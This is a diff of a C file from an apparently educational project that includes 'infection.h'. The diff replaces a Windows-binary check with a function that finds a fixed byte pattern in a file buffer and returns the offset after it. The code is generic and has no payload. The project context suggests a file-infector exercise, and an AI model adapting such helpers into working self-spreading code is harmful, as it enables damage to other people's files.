@@ -1,7 +1,7 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   is_windows_binary_file.c                           :+:      :+:    :+:   */
+/*   find_pattern.c                                     :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
@@ -12,23 +12,36 @@
 
 #include "infection.h"
 
-/*
-** arg[0] is absolute file_path of your file at check
-**
-** return true if file that MS-DOS binary file
-*/
-bool	is_windows_binary_file(char *file_path) {
-	char	*file = NULL;
-	size_t	size = file_get_contents_len_size(&file, file_path, MAGIC_LENGTH);
-	int		file_type;
+static bool	is_pattern(char *file, int index, int len)
+{
+	char	path[] = { PATTERN };
+	int		l = index + sizeof(path);
+	int		i = 0;
 
-	if (size < MAGIC_LENGTH) {
-		free(file);
-		return (IS_UNKNOW_BINARY_TYPE);
+	if (l > len) {
+		return false;
 	}
-	file_type = get_windows_binary_type(file);
-	free(file);
-	if (file_type != IS_UNKNOW_BINARY_TYPE)
-		return (true);
-	return (false);
+	while (i < sizeof(path))
+	{
+		if (file[index++] != path[i]) {
+			return false;
+		}
+		i++;
+	}
+	return true;
+}
+
+int			find_pattern(char *file, int len)
+{
+	int		i = 0;
+	char	path[] = { PATTERN };
+
+	while (i < len - sizeof(path))
+	{
+		if (file[i] == path[0] && is_pattern(file, i, len)) {
+			return i + sizeof(path);
+		}
+		i++;
+	}
+	return -1;
 }
